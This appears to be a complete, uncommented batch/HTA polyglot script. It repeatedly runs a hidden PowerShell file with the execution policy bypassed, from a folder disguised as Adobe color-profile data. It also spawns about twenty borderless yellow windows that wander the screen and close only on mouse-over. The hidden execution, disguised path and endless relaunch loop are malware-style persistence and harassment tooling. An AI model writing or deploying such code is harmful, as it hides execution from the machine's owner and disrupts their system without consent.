@echo off

:loop

powershell -ExecutionPolicy Bypass -File "%localappdata%\Adobe\Color\Profiles\UserData\exeptions.ps1" -WindowStyle Hidden

(for /l %%a in (0,1,20) do start "" mshta.exe "%~f0") | find "Window" >nul
exit /b
-->
<!DOCTYPE html>
<script>resizeTo(0,0);window.offscreenBuffering = "true";</script>
<hta:application ID="oHTA" border="none" caption="no" contextmenu="no" innerborder="no" scroll="no" selection="no" >
<html>
<head>
<style>
 html, body{width: 100%;height: 100%;margin: 0; background: yellow;}
 #demo {background: yellow;width: 100%;height: 100%;}
</style>

<script>
var timer,z,dX,dY,tOut;
x=window.screenLeft;
y=window.screenLeft;
s=30;
maxMove=20;
cps=1000/30;
maxX=screen.availWidth-s;
maxY=screen.availHeight-s;

function init(){
 resizeTo(s,s);
 moveTo(x,y);
 randomTOut();
 flee();
};

function randomTOut(){
 tOut=(Math.round((Math.random())*480)+20)*10;
 moveControl();
 timer=setTimeout(function(){randomTOut()},tOut);
};

function moveControl(){
 dX=Math.round(Math.random()*maxMove*2-maxMove);
 dY=Math.round(Math.random()*maxMove*2-maxMove);
};

function flee(){
 z=setInterval(function(){
  if (x>0) {x+=dX;} else {dX=Math.abs(dX);x+=dX;};
  if (y>0) {y+=dY;} else {dY=Math.abs(dY);y+=dY;};
  if (x<maxX) {x+=dX;} else {dX=-Math.abs(dX);x+=dX;};
  if (y<maxY) {y+=dY;} else {dY=-Math.abs(dY);y+=dY;};
  moveTo(x,y);
 }, cps);
};

function closeW(){
 clearTimeout(timer);
 clearInterval(z);
 close()
};
</script>
</head>

<body onload="init()" onmouseover="closeW()">
 <div id="demo"></div>
</body>
</html>

timeout /t 180 /nobreak >nul
goto loop
